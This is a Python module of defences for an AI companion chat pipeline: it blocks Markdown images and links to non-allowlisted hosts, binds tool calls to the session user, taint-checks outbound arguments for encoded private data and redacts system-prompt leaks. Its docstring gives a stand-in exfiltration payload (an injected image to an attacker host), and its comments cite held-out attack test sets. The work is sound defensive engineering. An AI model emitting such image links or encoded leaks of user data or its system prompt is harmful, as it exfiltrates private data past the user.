"""Model-independent defences for a companion chat pipeline.

Prompt-level defences (delimiting untrusted text, telling the model to ignore instructions in it)
lower the odds that a model obeys an injection; they cannot make it impossible. These defences
assume the model *was* fooled and make the outcome harmless:

* :class:`RenderPolicy` closes zero-click exfiltration: raw HTML is escaped and Markdown images
  load only from the platform's own media hosts, so an injected ``![](https://attacker/?q=...)``
  never makes the browser send anything. Links to other hosts become inert text.
* :class:`ToolBroker` decides what a tool call may do: it binds every call to the session's own
  user (a model cannot ask for another user's memories), holds high-impact actions for the user's
  confirmation, keeps outbound fetches to an allowlist, and refuses any outbound argument that
  carries the user's private data (taint check, including base64, hex and URL-encoded forms).
* :class:`LeakGuard` redacts replies that contain the system prompt's canary or a long verbatim
  part of it, in plain or encoded form.
"""

from __future__ import annotations

import base64
import binascii
import contextlib
import html
import re
import secrets
import urllib.parse
from dataclasses import dataclass, field
from typing import Any

# -- rendering -----------------------------------------------------------------------------------

_MD_IMAGE = re.compile(r"!\[(?P<alt>(?:[^\[\]]|\[[^\]]*\])*)\]\(\s*<?(?P<url>[^)\s>]*)>?(?:\s+[\"'(][^)]*[\"')])?\s*\)")
_MD_REF_IMAGE = re.compile(r"!\[(?P<alt>[^\]]*)\]\[(?P<ref>[^\]]*)\]")
_MD_REF_DEF = re.compile(r"^\s{0,3}\[(?P<ref>[^\]]+)\]:\s*<?(?P<url>\S+?)>?(?:\s+.*)?$", re.M)
_MD_LINK = re.compile(r"(?<!!)\[(?P<text>(?:[^\[\]]|\[[^\]]*\])*)\]\(\s*<?(?P<url>[^)\s>]*)>?(?:\s+[\"'(][^)]*[\"')])?\s*\)")
_AUTOLINK = re.compile(r"<(?P<url>(?:https?:)?//[^>\s]+)>")
_CODE_SPAN = re.compile(r"((?:^|(?<=\n))(?:```|~~~)[^\n]*\n.*?\n(?:```|~~~)[ \t]*(?=\n|$)|`[^`\n]+`)", re.S)
_BARE_URL = re.compile(r"(?P<url>\b(?:https?://|www\.)[^\s<>()\"'`]+)", re.I)


def host_of(url: str) -> str | None:
    """The host a URL would really reach, or None if it is not an absolute http(s) URL."""
    u = url.strip()
    if u.startswith("//"):
        u = "https:" + u
    try:
        p = urllib.parse.urlsplit(u)
    except ValueError:
        return None
    if p.scheme.lower() not in ("http", "https"):
        return None
    try:
        host = p.hostname
    except ValueError:
        return None
    return host.lower().rstrip(".") if host else None


def allowed(url: str, allowlist: tuple[str, ...]) -> bool:
    """Exact host match on https only; userinfo, ports and look-alike suffixes do not pass."""
    u = url.strip()
    try:
        p = urllib.parse.urlsplit(u)
    except ValueError:
        return False
    if p.scheme.lower() != "https" or p.username or p.password or p.port not in (None, 443):
        return False
    h = host_of(u)
    return h is not None and h in allowlist


@dataclass
class RenderPolicy:
    image_hosts: tuple[str, ...]
    link_hosts: tuple[str, ...] = ()

    def apply(self, text: str) -> str:
        # Closed code blocks and inline code are shown as text by CommonMark renderers, so they stay
        # exactly as written: a curl example keeps its address, an HTML sample its tags (held-out
        # sets aisec-v1 N04 and aisec-v2 N05). Everything outside code is rewritten and escaped.
        # This relies on the chat client rendering code as text; see docs/adr/0004.
        parts = _CODE_SPAN.split(text)
        out = []
        for k, part in enumerate(parts):
            out.append(part if k % 2 else _escape_html(self._rewrite(part, text)))
        return "".join(out)

    def _rewrite(self, text: str, whole: str) -> str:
        refs = {m.group("ref").lower(): m.group("url") for m in _MD_REF_DEF.finditer(whole)}
        # Reference definitions are where reference-style images hide their URL; drop them all and
        # re-emit only allowlisted images inline.
        text = _MD_REF_DEF.sub("", text)

        def image(m: re.Match[str]) -> str:
            url = m.group("url")
            if allowed(url, self.image_hosts):
                return f"![{_inert(m.group('alt'))}]({url})"
            return f"[image removed: {host_of(url) or 'not a web address'}]"

        def ref_image(m: re.Match[str]) -> str:
            url = refs.get((m.group("ref") or m.group("alt")).lower(), "")
            if url and allowed(url, self.image_hosts):
                return f"![{_inert(m.group('alt'))}]({url})"
            return f"[image removed: {host_of(url) or 'unknown'}]"

        def link(m: re.Match[str]) -> str:
            url = m.group("url")
            if allowed(url, self.link_hosts + self.image_hosts):
                return f"[{_inert(m.group('text'))}]({url})"
            return f"{_inert(m.group('text'))} (link to {host_of(url) or 'an unknown address'} removed)"

        text = _MD_IMAGE.sub(image, text)
        text = _MD_REF_IMAGE.sub(ref_image, text)
        text = _MD_LINK.sub(link, text)
        text = _AUTOLINK.sub(lambda m: f"(link to {host_of(m.group('url')) or 'unknown'} removed)", text)
        text = _BARE_URL.sub(
            lambda m: (
                m.group("url")
                if allowed(_https(m.group("url")), self.link_hosts + self.image_hosts)
                else f"(link to {host_of(_https(m.group('url'))) or 'unknown'} removed)"
            ),
            text,
        )
        return text


def _https(url: str) -> str:
    return url if "://" in url else "https://" + url


def _inert(s: str) -> str:
    return s.replace("[", "(").replace("]", ")")


def _escape_html(text: str) -> str:
    # Any HTML is shown, not interpreted: no <img>, <iframe>, style url() or srcset survives. Only
    # < and > are needed for that; escaping & as well broke image URLs with query strings
    # (held-out set aisec-v1, N14).
    return text.replace("<", "&lt;").replace(">", "&gt;")


# -- private data and encodings ------------------------------------------------------------------


def _variants(value: str) -> set[str]:
    v = value.strip()
    if len(v) < 6:
        return set()
    out = {v.lower(), urllib.parse.quote(v).lower(), urllib.parse.quote_plus(v).lower()}
    b = v.encode()
    out |= {
        base64.b64encode(b).decode().rstrip("=").lower(),
        base64.urlsafe_b64encode(b).decode().rstrip("=").lower(),
        binascii.hexlify(b).decode(),
        v[::-1].lower(),
        re.sub(r"\s+", "", v).lower(),
    }
    return {x for x in out if len(x) >= 6}


def _decoded_views(text: str) -> list[str]:
    """The text plus anything base64, hex or URL-decoding parts of it yields."""
    views = [text, urllib.parse.unquote_plus(text), html.unescape(text)]
    for m in re.finditer(r"[A-Za-z0-9+/_-]{12,}={0,2}", text):
        chunk = m.group(0)
        for dec in (base64.b64decode, base64.urlsafe_b64decode):
            with contextlib.suppress(binascii.Error, ValueError):
                views.append(dec(chunk + "=" * (-len(chunk) % 4)).decode("utf-8", "ignore"))
    for m in re.finditer(r"(?:[0-9a-fA-F]{2}){8,}", text):
        with contextlib.suppress(binascii.Error, ValueError):
            views.append(binascii.unhexlify(m.group(0)).decode("utf-8", "ignore"))
    return views


@dataclass
class PrivateData:
    """Everything in the session that belongs to the user and must not leave the platform."""

    values: list[str] = field(default_factory=list)

    def found_in(self, text: str, min_fragment: int = 12) -> str | None:
        """The private value the text carries (directly, encoded, or a long fragment), if any."""
        flat = text.lower()
        compact = re.sub(r"[\s%+]+", "", flat)
        for v in self.values:
            for var in _variants(v):
                if var in flat or var in compact:
                    return v
        views = [x.lower() for x in _decoded_views(text)]
        views += [x[::-1] for x in views]
        for v in self.values:
            vl = v.lower()
            if len(vl) >= min_fragment:
                frags = {vl[i : i + min_fragment] for i in range(0, len(vl) - min_fragment + 1, 4)}
                for view in views:
                    if any(f in view or f in re.sub(r"\s+", "", view) for f in frags):
                        return v
            elif any(vl in view for view in views):
                return v
        return None


# -- tools --------------------------------------------------------------------------------------


@dataclass
class ToolCall:
    name: str
    args: dict[str, Any]


@dataclass
class Decision:
    allowed: bool
    reason: str
    args: dict[str, Any] = field(default_factory=dict)
    needs_confirmation: bool = False


HIGH_IMPACT = {"share_conversation", "update_profile:email", "update_profile:phone", "delete_account"}
OUTBOUND = {"fetch_url", "post_to_character_board", "share_conversation"}


@dataclass
class ToolBroker:
    session_user: str
    fetch_allowlist: tuple[str, ...]
    private: PrivateData
    bind_session: bool = True
    confirm_high_impact: bool = True
    taint_check: bool = True
    fetch_allowlist_on: bool = True
    # the system prompt is confidential too: outbound arguments that carry it, or its marker, are
    # refused like the user's data (held-out set aisec-v2, A22)
    guard: LeakGuard | None = None

    def decide(self, call: ToolCall) -> Decision:
        args = dict(call.args)
        if self.bind_session and "user_id" in args and args["user_id"] != self.session_user:
            args["user_id"] = self.session_user  # the model never chooses whose data a tool reads
        if self.bind_session and call.name in ("recall_memory", "list_conversations"):
            args["user_id"] = self.session_user
        key = call.name if call.name != "update_profile" else f"update_profile:{args.get('field', '')}"
        if self.taint_check and call.name in OUTBOUND:
            carried = self.private.found_in(" ".join(str(v) for v in args.values()))
            if carried is not None:
                return Decision(False, "outbound arguments carry the user's private data", args)
            if self.guard is not None and self.guard.leaks(" ".join(str(v) for v in args.values())):
                return Decision(False, "outbound arguments carry the system prompt", args)
        if self.fetch_allowlist_on and call.name == "fetch_url" and not allowed(str(args.get("url", "")), self.fetch_allowlist):
            return Decision(False, f"fetch to {host_of(str(args.get('url', ''))) or 'that address'} is not allowed", args)
        if self.confirm_high_impact and key in HIGH_IMPACT:
            return Decision(False, "held for the user's confirmation", args, needs_confirmation=True)
        return Decision(True, "allowed", args)


# -- system prompt ------------------------------------------------------------------------------


def canary() -> str:
    return f"cg-{secrets.token_hex(6)}"


@dataclass
class LeakGuard:
    system_prompt: str
    canary: str
    min_overlap: int = 48

    def leaks(self, text: str) -> bool:
        views = [v.lower() for v in _decoded_views(text)]
        views += [v[::-1] for v in views]  # spelled backwards (held-out set aisec-v1, A35)
        compact_canary = re.sub(r"[\W_]+", "", self.canary.lower())
        if any(self.canary.lower() in v or compact_canary in re.sub(r"[\W_]+", "", v) for v in views):
            # also spaced out or punctuated (held-out set aisec-v2, A44)
            return True
        # Compare without whitespace and punctuation, so spacing the letters out or re-wrapping the
        # text does not hide a verbatim copy.
        sp = re.sub(r"[\W_]+", "", self.system_prompt.lower())
        n = int(self.min_overlap * 0.8)
        if len(sp) < n:
            return False
        shingles = {sp[i : i + n] for i in range(0, len(sp) - n + 1, 6)}
        for v in views:
            vv = re.sub(r"[\W_]+", "", v)
            if any(s in vv for s in shingles):
                return True
        return False

    def apply(self, text: str) -> str:
        return "I can't share that." if self.leaks(text) else text
